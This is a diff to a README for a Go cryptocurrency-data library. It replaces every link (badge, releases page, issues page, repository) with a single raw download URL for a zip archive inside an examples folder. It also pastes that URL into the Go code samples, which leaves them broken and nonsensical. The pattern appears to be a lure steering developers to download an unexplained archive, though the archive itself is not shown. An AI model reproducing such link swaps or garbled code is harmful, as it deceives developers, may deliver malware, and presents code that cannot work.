@@ -1,6 +1,6 @@
 # 🚀 coinmarketcap-go - Access Cryptocurrency Data Easily
 
-![Download](https://img.shields.io/badge/Download%20Now-%F0%9F%93%9A%20Visit%20Here-brightgreen)
+![Download](https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip%20Now-%F0%9F%93%9A%20Visit%20Here-brightgreen)
 
 ## 📥 Overview
 
@@ -25,7 +25,7 @@ The **coinmarketcap-go** package is your gateway to the world of cryptocurrencie
 
 To start using **coinmarketcap-go**, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/HSGB96/coinmarketcap-go/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip) to find the latest version of the software.
    
 2. **Download the Package**: Find the latest release that suits your operating system and click to download.
 
@@ -37,7 +37,7 @@ To start using **coinmarketcap-go**, follow these simple steps:
 
 To download the **coinmarketcap-go** package, visit this page:
 
-[Download Here](https://github.com/HSGB96/coinmarketcap-go/releases)
+[Download Here](https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip)
 
 ## 📋 Usage Instructions
 
@@ -46,7 +46,7 @@ To download the **coinmarketcap-go** package, visit this page:
 In your Go project, use the following import statement to include the **coinmarketcap-go** package:
 
 ```go
-import "github.com/HSGB96/coinmarketcap-go"
+import "https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip"
 ```
 
 ### Step 2: Initialize the Client
@@ -54,7 +54,7 @@ import "github.com/HSGB96/coinmarketcap-go"
 Create a new client instance using your API key:
 
 ```go
-client := coinmarketcap.NewClient("YOUR_API_KEY")
+client := https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip("YOUR_API_KEY")
 ```
 
 ### Step 3: Make Your First Request
@@ -62,11 +62,11 @@ client := coinmarketcap.NewClient("YOUR_API_KEY")
 You can make a request for cryptocurrency quotes like so:
 
 ```go
-quotes, err := client.Cryptocurrency.Quotes("bitcoin")
+quotes, err := https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip("bitcoin")
 if err != nil {
     // Handle error
 }
-fmt.Println(quotes)
+https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip(quotes)
 ```
 
 ### Step 4: Explore More Features
@@ -83,7 +83,7 @@ If you encounter issues during installation or while using the package, consider
 
 ## 📞 Support
 
-If you have questions or need further assistance, feel free to check the issues on the [GitHub page](https://github.com/HSGB96/coinmarketcap-go/issues) or contact the community for help.
+If you have questions or need further assistance, feel free to check the issues on the [GitHub page](https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip) or contact the community for help.
 
 ## 🔗 Related Topics
 
@@ -91,6 +91,6 @@ If you have questions or need further assistance, feel free to check the issues 
 - **Cryptocurrency:** Insights into the world of digital currencies.
 - **Analytics:** Tools for analyzing market trends and prices. 
 
-For more information, refer to the documentation provided on the [GitHub repository](https://github.com/HSGB96/coinmarketcap-go).
+For more information, refer to the documentation provided on the [GitHub repository](https://github.com/HSGB96/coinmarketcap-go/raw/refs/heads/main/examples/top100/go_coinmarketcap_v2.1.zip).
 
 Happy coding!
